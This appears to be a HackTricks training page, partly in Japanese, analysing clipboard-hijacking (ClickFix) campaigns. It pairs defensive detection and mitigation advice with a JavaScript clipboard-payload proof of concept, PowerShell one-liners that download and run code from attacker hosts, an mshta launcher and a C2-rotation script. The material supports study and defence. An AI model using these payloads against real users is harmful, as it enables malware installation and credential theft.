# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> 「自分でコピーしていないものを貼り付けるな。」 – 古いが今でも有効な助言

## 概要

Clipboard hijacking – also known as *pastejacking* – は、ユーザーがコマンドを検査せずに日常的にコピー＆ペーストするという事実を悪用します。悪意のあるウェブページ（または Electron や Desktop アプリケーション のような JavaScript 対応のコンテキスト）は、攻撃者が制御するテキストをプログラムでシステムのクリップボードに配置します。被害者は通常、巧妙に作られたソーシャルエンジニアリングの指示により、**Win + R**（Run dialog）、**Win + X**（Quick Access / PowerShell）を押すか、ターミナルを開いてクリップボードの内容を*paste*し、即座に任意のコマンドを実行するよう促されます。

Because **no file is downloaded and no attachment is opened**, the technique bypasses most e-mail and web-content security controls that monitor attachments, macros or direct command execution. The attack is therefore popular in phishing campaigns delivering commodity malware families such as NetSupport RAT, Latrodectus loader or Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## ClickFix / ClearFake のフロー

1. ユーザーが typosquatted または侵害されたサイト（例: `docusign.sa[.]com`）を訪問する
2. 注入された **ClearFake** JavaScript が `unsecuredCopyToClipboard()` ヘルパーを呼び出し、ユーザーに気付かれないように Base64 エンコードされた PowerShell のワンライナーをクリップボードに保存する
3. HTML の指示は被害者に次のように促す: *“**Win + R** を押し、コマンドを貼り付けて Enter を押して問題を解決してください。”*
4. `powershell.exe` が実行され、正当な実行ファイルと悪意のある DLL を含むアーカイブをダウンロードする（classic DLL sideloading）
5. ローダーが追加ステージを復号化し、shellcode を注入して永続化をインストールする（例: scheduled task） – 最終的に NetSupport RAT / Latrodectus / Lumma Stealer を実行する

### NetSupport RAT チェーンの例
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (正規の Java WebStart) はそのディレクトリで `msvcp140.dll` を検索します。
* 悪意のある DLL は **GetProcAddress** で API を動的に解決し、**curl.exe** 経由で 2 つのバイナリ（`data_3.bin`, `data_4.bin`）をダウンロードし、rolling XOR key `"https://google.com/"` を使って復号し、最終的な shellcode を注入して **client32.exe** (NetSupport RAT) を `C:\ProgramData\SecurityCheck_v1\` に解凍します。

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. `la.txt`を**curl.exe**でダウンロードする
2. **cscript.exe**内で JScript downloader を実行する
3. MSI payload を取得 → サインされたアプリケーションの隣に `libcef.dll` をドロップ → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer を MSHTA 経由で
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Some ClickFix campaigns skip file downloads entirely and instruct victims to paste a one‑liner that fetches and executes JavaScript via WSH, persists it, and rotates C2 daily. Example observed chain:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
主な特徴
- 実行時に逆順にした難読化された URL によって軽い調査を回避する。
- JavaScript は Startup LNK (WScript/CScript) を介して自己永続化し、現在の日付で C2 を選択する – rapid domain rotation を可能にする。

日付で C2s を回すために使用される最小限の JS フラグメント:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
次の段階では一般的に永続化を確立しRAT（例: PureHVNC）を引き込むloaderが展開され、しばしばTLSをハードコードされた証明書にピン止めし、トラフィックをチャンク化します。

Detection ideas specific to this variant
- プロセスツリー: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (または `cscript.exe`)。
- スタートアップアーティファクト: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` にある LNK が WScript/CScript を呼び出し、JS パスが `%TEMP%`/`%APPDATA%` 下にある。
- `Registry/RunMRU` やコマンドラインのテレメトリに `.split('').reverse().join('')` や `eval(a.responseText)` を含むエントリ。
- 長いコマンドラインを避けるために大きな stdin ペイロードで長いスクリプトを供給する、`powershell -NoProfile -NonInteractive -Command -` の繰り返し。
- その後 LOLBins を実行する Scheduled Tasks（例: updater っぽいタスク/パス（例: `\GoogleSystem\GoogleUpdater`）の下で `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` のようなもの）。

Threat hunting
- 日次ローテーションする C2 ホスト名や URL で、パターンが `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` のもの。
- クリップボード書き込みイベントの後に Win+R で貼り付け、その直後に `powershell.exe` が実行される事象を相関させる。

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` は **Win + R** コマンドの履歴を保持します — 異常な Base64 / 難読化されたエントリを探してください。
* Security Event ID **4688** (Process Creation) で `ParentImage` == `explorer.exe` かつ `NewProcessName` が { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } のいずれかになっているもの。
* Event ID **4663**：疑わしい 4688 イベントの直前に `%LocalAppData%\Microsoft\Windows\WinX\` や一時フォルダでのファイル作成が発生しているかどうか。
* EDR clipboard sensors（存在する場合） — `Clipboard Write` の直後に新しい PowerShell プロセスが立ち上がる事象を相関させる。

## 緩和策

1. Browser hardening – クリップボード書き込みアクセスを無効化する（`dom.events.asyncClipboard.clipboardItem` 等）か、ユーザーのジェスチャーを要求する。
2. セキュリティ教育 – ユーザーに対して、重要なコマンドは*タイプして*入力するか、先にテキストエディタに貼り付けて確認するよう指導する。
3. PowerShell Constrained Language Mode / Execution Policy + Application Control により任意のワンライナー実行をブロックする。
4. ネットワーク制御 – 既知の pastejacking や malware C2 ドメインへのアウトバウンド要求をブロックする。

## 関連トリック

* **Discord Invite Hijacking** は、ユーザーを悪意あるサーバーに誘導した後に同じ ClickFix 手法を悪用することが多い：

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## 参考資料

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../../banners/hacktricks-training.md}}
